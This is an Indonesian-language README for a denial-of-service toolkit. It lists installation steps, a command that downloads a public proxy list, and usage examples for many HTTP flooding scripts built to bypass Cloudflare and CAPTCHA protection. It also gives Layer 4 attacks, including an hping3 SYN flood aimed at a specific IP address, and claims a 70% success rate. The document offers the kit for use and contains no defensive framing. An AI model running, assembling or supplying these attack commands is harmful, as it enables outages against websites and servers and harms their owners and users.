
=========================== INSTALASI ===================================

1. git clone https://github.com/nodesource/distributions#ubuntu-versions

2. sudo apt-get update

3. sudo apt-get install -y ca-certificates curl gnupg

4. sudo mkdir -p /etc/apt/keyrings

5. curl -fsSL https://deb.nodesource.com/gpgkey/nodesource-repo.gpg.key | sudo gpg --dearmor -o /etc/apt/keyrings/nodesource.gpg

6. echo "deb [signed-by=/etc/apt/keyrings/nodesource.gpg] https://deb.nodesource.com/node_18.x nodistro main" | sudo tee /etc/apt/sources.list.d/nodesource.list

7. sudo apt-get update

8. sudo apt-get install nodejs -y

9. git clone <link github>

10. sudo apt update && apt install unzip python3 golang python2 python3-pip gcc -y

11. npm install requests https-proxy-agent crypto-random-string events fs net cloudscraper cloudscraper request hcaptcha-solver randomstring cluster  gradient-string cloudflare-bypasser axios cheerio user-agents fake-useragent

12. ulimit -n 999999

13. apt install hping3

14. cd laxy

===========================CARA MENJALANKAN=============================

(PALING SERING DIGUNAKAN http1.js bypass.js uambypass.js hping3)
kemungkinan berhasil 70% dengan bot diatas

1.AMBIL PROXY MENGGUNAKAN

curl https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt -o proxy.txt

2. JALANKAN BOT 

(LAYER 7)
a. BOT.JS
USAGE   -> node BOT.js <HOST> <TIME> <RPS> <THREADS> <PROXY>
EXAMPLE -> node BOT.js target 3600 10 4 proxy.txt

b. HTTP-RAW.js
USAGE   -> node HTTP-RAW.js url time
EXAMPLE ->node HTTP-RAW.js target 3600

c. TLS.js	
USAGE   -> node TLS.js <HOST> <TIME> <RPS> <THREADS>
EXAMPLE ->node TLS.js target 3600 10 4

d. bypass.js
USAGE   -> node bypass.js <HOST> <TIME> <RPS> <THREADS> <PROXY>
EXAMPLE ->node bypass.js target 3600  10 4 proxy.txt

e. flooder.js
USAGE   -> node flooder.js <url> <time> <requests> <threads> <proxy> ( options: <cookie> )
EXAMPLE ->node flooder.js target 3600 10 4 proxy.txt ( options: <cookie> )

f. flooderv2.js 
EXAMPLE ->node flooderv2.js target 120 4 proxy.txt 10 flood (bisa diisi flood atau bypass)

g. http1.js 
USAGE   -> node http1.js <MODE> <host> <proxies> <duration> <rate> <threads>
EXAMPLE ->node http1.js GET target proxy.txt 7200 10 4 (bisa diisi GET atau POST)

h. hyper.js
USAGE   -> node hyper.js <url> <time>
EXAMPLE ->node hyper.js target 3600

i. newhttp2.js 
EXAMPLE ->node newhttp2.js target 3600 4 proxy.txt 10

j. uambypass.js
USAGE   -> node uambypass.js <url> <time> <req_per_ip> <proxies>
EXAMPLE ->node uambypass.js target 3600 100 proxy.txt

k. v2.js
USAGE   -> node v2.js [URL] [TIME]
EXAMPLE ->node v2.js target 3600

(LAYER 4)
a. papin.py
python3 paping.py <ip target> <port>

b. hping3
sudo hping3 -d 200 -p 443 -S --flood 103.177.141.22 (ganti ip dengan ip target)
